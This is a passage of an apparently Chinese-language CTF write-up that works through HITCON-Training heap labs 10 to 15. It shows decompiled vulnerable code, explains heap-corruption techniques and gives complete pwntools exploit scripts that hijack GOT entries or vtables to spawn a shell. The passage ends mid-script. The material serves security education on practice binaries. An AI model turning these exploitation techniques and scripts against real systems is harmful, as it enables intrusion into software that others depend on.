class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"0"</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">"1"</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(magic))</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>方法一： house of force</strong></p><p>利用<code>change_item</code>里面修改content可以自定义长度的漏洞，修改<code>top chunk size</code>，malloc一个大数/负数来实现控制<code>top_chunk</code>的指针，从而达到任意地址写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc(0x10uLL);</span><br><span class="line">*v3 = hello_message;</span><br><span class="line">v3[1] = goodbye_message;</span><br></pre></td></tr></table></figure></p><p>程序在开头将两个函数地址放进heap中，将<code>goodbye_message</code>改成<code>magic</code>即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">"debug"</span>) </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./bamboobox"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1111"</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) <span class="comment"># overwrite top chunk size</span></span><br><span class="line">add(<span class="number">-160</span>,<span class="string">"2222"</span>) <span class="comment"># 减小top chunk指针</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>) <span class="comment"># 分配块实现任意地址写</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><strong>方法二：unlink</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x000000000063d030 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000800x000000000063d080 </span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br><span class="line">-----------------unlink后-----------------</span><br><span class="line">pwndbg&gt; x/16gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:0x00000000000000400x00000000006020b0 &lt;== ptr</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:0x00000000000000400x000000000063d110</span><br></pre></td></tr></table></figure></p><p>制造fakechunk，修改<code>box0</code>的<code>content</code>指向<code>0x6020c8-0x18</code>，此时修改<code>box0</code>的<code>content</code>，就能写入<code>0x6020b0</code>处，改写成<code>atoi@got</code>，然后泄露地址并修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>, <span class="string">'0'</span> * <span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span> * <span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">'2'</span> * <span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span> <span class="comment"># box0的content</span></span><br><span class="line"></span><br><span class="line">fakeChunk = flat([<span class="number">0</span>, <span class="number">0x41</span>, ptr - <span class="number">0x18</span>, ptr - <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x90</span>])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x50</span>, fakeChunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40</span>, elf.got[<span class="string">'atoi'</span>]])</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">show()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x8</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab12-secretgarden"><a href="#lab12-secretgarden" class="headerlink" title="lab12-secretgarden"></a>lab12-secretgarden</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序菜单如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 . Raise a flower</span><br><span class="line">2 . Visit the garden</span><br><span class="line">3 . Remove a flower from the garden</span><br><span class="line">4 . Clean the garden</span><br><span class="line">5 . Leave the garden</span><br></pre></td></tr></table></figure></p><p>结构体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct flower</span><br><span class="line">&#123;</span><br><span class="line">  __int64 inuse;</span><br><span class="line">  char *name;</span><br><span class="line">  char color[24];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>漏洞点在<code>del()</code>，存在double free漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !flowercount )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) ) <span class="comment">//没有检查inuse标记位</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD((*(&amp;flowerlist + v1))-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((*(&amp;flowerlist + v1))-&gt;name);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>采用fastbin dup修改free@got即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(length))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"4"</span>)</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>) <span class="comment">#0</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"1"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"0"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab13-heapcreator"><a href="#lab13-heapcreator" class="headerlink" title="lab13-heapcreator"></a>lab13-heapcreator</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>漏洞点在<code>edit_heap()</code>，留意以下代码，出现了off-by-one漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( heaparray[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Content of heap : &quot;, &amp;buf);</span><br><span class="line">  read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + 1); //多了一字节</span><br><span class="line">  puts(&quot;Done !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>本题需要利用<code>Extend the chunk</code>，利用前提是存在可控的off-by-one，创造出overlap chunk，进而更改其他chunk中的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"0000"</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1111"</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span>*<span class="number">0x18</span> + <span class="string">"\x41"</span>) <span class="comment"># off by one</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># overlap chunk</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">'atoi'</span>])) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment"># leak libc.address</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">"atoi"</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab14-magicheap"><a href="#lab14-magicheap" class="headerlink" title="lab14-magicheap"></a>lab14-magicheap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>unsorted bin attack原理：堆在分配的时候，如果在申请的内存大小所对应的small bin或者large bin里面没有找到对应的chunk，此时会从unsorted bin里面去寻找chunk看是否存在合适的内存分配给用户，这个过程中会把unsorted bin链表给清空，清空的过程中没有进行检查，由此可能会发生任意地址可写。源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p>如果bck的fd可以被我们控制，这个时候我们就可以让它指向任意地址，最终使<code>*(bck-&gt;fd)+0x10</code>的值被修改成<code>unsorted_chunks(av)</code>(一般来说是一个很大的正数，无法控制)。常见套路是修改<code>global_max_fast</code>全局变量，这个变量用于控制最大的Fast chunk的大小，就能使之后的chunk都被当作fast chunk，即可进行Fast bin attack</p><p>参考代码<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c</a></p><p>漏洞在<code>edit</code>函数，编辑的时候任意指定长度，本题只需要修改<code>magic</code>的值即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v2] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size of Heap : "</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">  v0 = atoi(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">  read_input(heaparray[v2], v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./magicheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./magicheap"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content, attack = False)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C8C\nc\n'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'cccc'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">"magic"</span>] - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x10</span> + <span class="number">0x20</span>, payload)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'dddd'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"4869"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab15-zoo"><a href="#lab15-zoo" class="headerlink" title="lab15-zoo"></a>lab15-zoo</h3><p>参考资料：<a href="https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf" target="_blank" rel="noopener">https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>漏洞点在<code>strcpy</code>，没有限制长度，可以覆盖其他chunk：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">weight = w ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow ~ Wow ~ Wow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">                ...</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>程序没有开nx，可以在<code>nameofzoo</code>里面放shellcode，覆盖vtable的指针即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 